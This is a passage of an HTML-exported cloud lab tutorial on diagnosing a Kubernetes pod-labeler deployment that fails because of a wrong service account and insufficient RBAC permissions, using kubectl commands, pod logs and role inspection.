&nbsp;  runAsGroup: 9999</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  runAsUser: 9999</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  serviceAccount: default</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>The </span><code>pod-labeler-fix-1.yaml</code><span> file contains the fix in the deployment&#39;s template spec:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  # Fix 1, set the serviceAccount so RBAC rules apply</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  serviceAccount: pod-labeler</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Next you&#39;ll apply the fix and view the resulting change.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, apply the fix 1 by running:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl apply -f manifests/pod-labeler-fix-1.yaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">role.rbac.authorization.k8s.io/pod-labeler unchanged</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">serviceaccount/pod-labeler unchanged</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">rolebinding.rbac.authorization.k8s.io/pod-labeler unchanged</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">deployment.apps/pod-labeler configured</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><ol start='' ><li><p><span>View the change in the deployment configuration:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get deployment pod-labeler -oyaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Changes in the output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ...</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  restartPolicy: Always</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  schedulerName: default-scheduler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  securityContext: {}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  serviceAccount: pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Fixing the service account name</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='diagnosing-insufficient-privileges'><span>Diagnosing insufficient privileges</span></h3><p><span>Once again, check the status of your pod and you&#39;ll notice it is still erring out, but with a different message this time.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance check the status of your pod:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get pods -l app=pod-labeler</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  READY &nbsp; &nbsp; STATUS &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; RESTARTS &nbsp; AGE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pod-labeler-c7b4fd44d-mr8qh &nbsp; 0/1 &nbsp; &nbsp; &nbsp; CrashLoopBackOff &nbsp; 3 &nbsp; &nbsp; &nbsp; &nbsp;  1m</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>You may need to run the previous command again to see this output.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, check the pod&#39;s logs:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl logs -l app=pod-labeler</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "/usr/local/lib/python3.8/site-packages/kubernetes/client/rest.py", line 292, in PATCH</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  return self.request("PATCH", url,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  File "/usr/local/lib/python3.8/site-packages/kubernetes/client/rest.py", line 231, in request</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  raise ApiException(http_resp=r)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubernetes.client.rest.ApiException: (403)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Reason: Forbidden</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP response headers: HTTPHeaderDict({'Audit-Id': 'f6c67c34-171f-42f3-b1c9-833e00cedd5e', 'Content-Type': 'application/json', 'X-Content-Type-Options': 'nosniff', 'Date': 'Mon, 23 Mar 2020 16:35:18 GMT', 'Content-Length': '358'})</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">HTTP response body: {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"pods \"pod-labeler-659c8c99d5-t96pw\" is forbidden: User \"system:serviceaccount:default:pod-labeler\" cannot patch resource \"pods\" in API group \"\" in the namespace \"default\"","reason":"Forbidden","details":{"name":"pod-labeler-659c8c99d5-t96pw","kind":"pods"},"code":403}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 293px;"></div><div class="CodeMirror-gutters" style="display: none; height: 293px;"></div></div></div></pre><p><span>Since this is failing on a PATCH operation, you can also see the error in Stackdriver. This is useful if the application logs are not sufficiently verbose.</span></p><ol start='' ><li><p><span>In the Console, select </span><strong><span>Navigation menu</span></strong><span>, and in the Operations section, click on </span><strong><span>Logging</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Query builder</span></strong><span> dialog box, paste the following code and click </span><strong><span>Run Query</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">protoPayload.methodName="io.k8s.core.v1.pods.patch"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click on a down arrow next to a log record and explore the details.</span></p></li></ol><h3 id='identifying-the-applications-role-and-permissions'><span>Identifying the application&#39;s role and permissions</span></h3><p><span>Use the ClusterRoleBinding to find the ServiceAccount&#39;s role and permissions.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, inspect the </span><code>rolebinding</code><span> definition:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get rolebinding pod-labeler -oyaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: rbac.authorization.k8s.io/v1</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: RoleBinding</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  annotations:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  kubectl.kubernetes.io/last-applied-configuration: |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  {"apiVersion":"rbac.authorization.k8s.io/v1","kind":"RoleBinding","metadata":{"annotations":{},"name":"pod-labeler","namespace":"default"},"roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"Role","name":"pod-labeler"},"subjects":[{"kind":"ServiceAccount","name":"pod-labeler"}]}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  creationTimestamp: "2020-03-23T16:29:05Z"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  namespace: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  resourceVersion: "2886"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  selfLink: /apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings/pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  uid: 0e4d5be7-d986-40d0-af1d-a660f9aa4336</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">roleRef:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  apiGroup: rbac.authorization.k8s.io</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  kind: Role</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: pod-labeler</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">subjects:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- kind: ServiceAccount</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: pod-labeler</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 495px;"></div><div class="CodeMirror-gutters" style="display: none; height: 495px;"></div></div></div></pre><p><span>The </span><code>RoleBinding</code><span> shows you need to inspect the </span><code>pod-labeler</code><span> role in the default namespace. Here you can see the role is only granted permission to list pods.</span></p><ol start='' ><li><p><span>On the </span><strong><span>admin</span></strong><span> instance, inspect the </span><code>pod-labeler</code><span> role definition:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kubectl get role pod-labeler -oyaml</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 